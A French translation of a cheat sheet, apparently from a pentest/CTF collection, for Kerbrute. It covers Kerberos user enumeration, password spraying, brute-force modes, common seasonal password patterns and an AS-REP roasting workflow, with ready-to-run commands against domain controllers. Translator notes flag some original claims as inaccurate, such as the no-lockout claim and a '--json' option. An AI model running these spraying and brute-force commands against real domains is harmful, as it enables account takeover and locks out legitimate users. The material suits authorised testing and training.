# 🔑 Kerbrute — énumération des utilisateurs Kerberos

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Outil de test de préauthentification Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Énumération">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Essais de mots de passe">
</p>

---

## 📋 Table des matières

- [Qu’est-ce que Kerbrute ?](#-quest-ce-que-kerbrute-)
- [Installation](#-installation)
- [Énumération des utilisateurs](#-énumération-des-utilisateurs)
- [Essais d’un mot de passe sur plusieurs comptes](#-essais-dun-mot-de-passe-sur-plusieurs-comptes)
- [Essais exhaustifs](#-essais-exhaustifs)
- [Référence rapide](#-référence-rapide)
- [Conseils pour les CTF](#-conseils-pour-les-ctf)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce que Kerbrute ?

**Kerbrute** exploite les échanges de préauthentification Kerberos pour énumérer les utilisateurs et tester un même mot de passe sur plusieurs comptes (*password spraying*) :

- 🔍 **Énumération des utilisateurs** — Rechercher des noms de comptes valides sans identifiants
- 🔐 **Password spraying** — Tester un même mot de passe sur plusieurs utilisateurs
- 💥 **Essais exhaustifs (brute force)** — Tester des identifiants
- 🚫 **Absence de risque de verrouillage** — Affirmation du texte original concernant les échecs de préauthentification, à nuancer ci-dessous

### Pourquoi Kerbrute ?

> **Correction importante :** le tableau ci-dessous et la puce précédente sont trop généraux. L’énumération sans préauthentification se distingue des essais de mots de passe : les échecs de ces derniers augmentent le compteur d’échecs et peuvent verrouiller les comptes. L’énumération peut aussi produire des événements ; peu de traces ne signifie pas absence de journalisation ([projet officiel](https://github.com/ropnop/kerbrute)).

| Méthode | Déclenche un verrouillage | Journaux générés |
|--------|------------------|----------------|
| Liaison LDAP | Oui | Oui |
| Authentification SMB | Oui | Oui |
| **Préauthentification Kerberos** | **Non, selon l’original** | Peu nombreux, selon l’original |

---

## 🚀 Installation

### Télécharger le binaire

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### Depuis les sources

```bash
go install github.com/ropnop/kerbrute@latest
```

### Vérifier l’installation

```bash
kerbrute --help
```

---

## 🔍 Énumération des utilisateurs

### Utilisation de base

```bash
# Énumérer les utilisateurs depuis une liste de noms
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Avec le nom d’hôte du contrôleur de domaine
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Options de sortie

> **Version des exemples :** `--json` n’apparaît pas dans le parseur officiel cité. L’option `-o` écrit un journal ; son contenu n’est pas nécessairement une simple liste de noms valides. Les commandes et sorties historiques restent inchangées ([options officielles](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go)).

```bash
# Sortie détaillée
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Écrire dans un fichier
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# Sortie JSON
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### Exécution concurrente (threads)

> **Précision :** l’aide décrit `--delay` comme un délai en millisecondes et annonce un fonctionnement sur un seul thread lorsqu’il est utilisé. Les valeurs de `-t` et `--delay` ne doivent donc pas être interprétées indépendamment ; vérifier le comportement de la version installée ([options officielles](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go)).

```bash
# Augmenter le nombre de threads (par défaut : 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Exécution concurrente prudente
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Exemple de sortie

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

## 🔐 Essais d’un mot de passe sur plusieurs comptes

### Essais de base

```bash
# Un même mot de passe pour plusieurs utilisateurs
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Depuis un fichier
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Plusieurs mots de passe

```bash
# Tester plusieurs mots de passe, l’un après l’autre
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Attendre 5 minutes entre les séries
done
```

### Sortie

```bash
# Afficher les identifiants valides
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Exemple de sortie

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Essais prudents

> **Précision :** un délai de 300 secondes ou un faible rythme ne garantit pas d’éviter le verrouillage. Le mode `--safe` documenté interrompt les essais lorsqu’un verrouillage est détecté ; ce n’est pas une garantie préventive. Le commentaire « depuis un fichier » plus haut désigne la liste d’utilisateurs : le mot de passe reste un argument littéral ([passwordspray](https://github.com/ropnop/kerbrute/blob/master/cmd/passwordspray.go), [README](https://github.com/ropnop/kerbrute)).

```bash
# Vérifier d’abord la stratégie de mots de passe
crackmapexec ldap DC01 -u user -p pass --password-policy

# Rythme faible et espacé
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

## 💥 Essais exhaustifs

### Essais exhaustifs sur un utilisateur

> **Correction du commentaire :** `bruteuser` teste une liste de mots de passe sur un seul compte, ici `admin`. Le mode `bruteforce` suivant teste les couples déjà présents dans le fichier ; il ne construit pas toutes les combinaisons possibles ([bruteuser](https://github.com/ropnop/kerbrute/blob/master/cmd/bruteuser.go), [bruteforce](https://github.com/ropnop/kerbrute/blob/master/cmd/bruteforce.go)).

```bash
# Tester toutes les combinaisons utilisateur:mot de passe
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Liste de couples d’identifiants

```bash
# Utiliser le format utilisateur:mot de passe
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Format de creds.txt :
# admin:Password1
# john:Summer2024
```

---

## 📊 Référence rapide

### Commandes

| Commande | Description |
|---------|-------------|
| `userenum` | Énumérer les noms d’utilisateurs valides |
| `passwordspray` | Tester un mot de passe sur plusieurs utilisateurs |
| `bruteuser` | Tester une liste de mots de passe sur un utilisateur |
| `bruteforce` | Tester des couples utilisateur:mot de passe |

### Options essentielles

| Option | Description |
|--------|-------------|
| `-d` | Nom de domaine |
| `--dc` | Adresse IP ou nom d’hôte du contrôleur de domaine |
| `-t` | Nombre de threads, par défaut : 10 |
| `-o` | Fichier de sortie |
| `-v` | Sortie détaillée |
| `--delay` | Délai entre les tentatives, en millisecondes |

### Énumération des utilisateurs

```bash
# Utilisation de base
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Avec une sortie enregistrée
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Rapide
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Password spraying

```bash
# Essais de base
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Essais prudents
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Listes de noms pour l’énumération

```bash
# Noms courants
/usr/share/seclists/Usernames/Names/names.txt

# Noms d’utilisateurs fréquents
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Format personnalisé
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Mots de passe courants

Les chaînes et motifs anglais du bloc sont conservés : saison et année, nom d’entreprise et chiffres, puis exemples génériques. Ces dates et valeurs sont des exemples, pas des recommandations de mots de passe.

```
Season+Year: Summer2024!, Winter2024!, Fall2024!
Company+Num: CompanyName123!, Company2024!
Generic: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 Conseils pour les CTF

1. **Commencer par l’énumération** — Rechercher les noms de comptes sans identifiants
2. **Examiner l’AS-REP** — Après avoir trouvé des comptes, vérifier l’absence de préauthentification
3. **Procéder prudemment** — Tester un mot de passe, puis attendre
4. **Vérifier la stratégie** — Connaître le seuil de verrouillage
5. **Utiliser un délai** — Réduire le rythme, sans garantie d’éviter la détection

### Déroulement

> **Précision :** ce déroulement est schématique : `-o users.txt` enregistre un journal, qui n’est pas directement une liste brute de noms pour `GetNPUsers.py`. L’option LDAP `--password-policy` de CrackMapExec montrée plus haut ne figure pas dans le parseur historique cité ; sa disponibilité dépend de l’outil et de sa version ([Kerbrute](https://github.com/ropnop/kerbrute), [parseur CME](https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py)).

```bash
# 1. Énumérer les utilisateurs
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Rechercher les comptes exposés à l’AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Tester un mot de passe sur plusieurs comptes
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Ressources

- [Kerbrute sur GitHub](https://github.com/ropnop/kerbrute)
- [Blog de ropnop](https://blog.ropnop.com/)

### Aide-mémoire associés
- [Méthodologie AD](../../AD-Attack-Methodology/translations/README.fr.md)
- [Rubeus](../../Rubeus/translations/README.fr.md)
- [CrackMapExec](../../CrackMapExec/translations/README.fr.md)

---

<p align="center">
  <b>🔑 Énumérez les utilisateurs et évaluez les mots de passe !</b><br>
  <i>Kerbrute — des tests Kerberos dont la portée dépend du contexte</i>
</p>
